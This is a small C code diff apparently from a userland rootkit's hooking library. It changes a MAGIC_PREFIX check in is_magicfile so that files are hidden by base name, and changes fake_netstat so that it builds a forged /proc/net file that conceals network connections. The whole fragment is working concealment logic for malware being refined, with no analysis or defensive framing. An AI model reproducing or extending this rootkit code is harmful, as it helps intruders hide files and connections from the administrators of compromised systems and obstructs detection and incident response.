@@ -39,7 +39,8 @@ int matches_reg(const char *reg, const char *str){
 }
 
 int is_magicfile(const char *filename){
-    return strncmp(filename, MAGIC_PREFIX, sizeof(MAGIC_PREFIX)-1) == 0;
+    char *file = basename(filename);
+    return strncmp(file, MAGIC_PREFIX, sizeof(MAGIC_PREFIX)-1) == 0;
 }
 
 int is_net_file(const char *pathname){
@@ -52,7 +53,8 @@ int fake_netstat(FILE *(*f)(const char *pathname, const char *mode), char *pathn
         return 0;
     }
     strcpy(newfile,FAKE_NETSTAT_FILE);
-    char *proto = pathname + sizeof("/proc/net/") - 1;
+    // char *proto = pathname + sizeof("/proc/net/") - 1;
+    char *proto = basename(pathname);
     strcat(newfile,proto);
     FILE *fake_fp = f(newfile,"w");
     char hex_port[7]; 
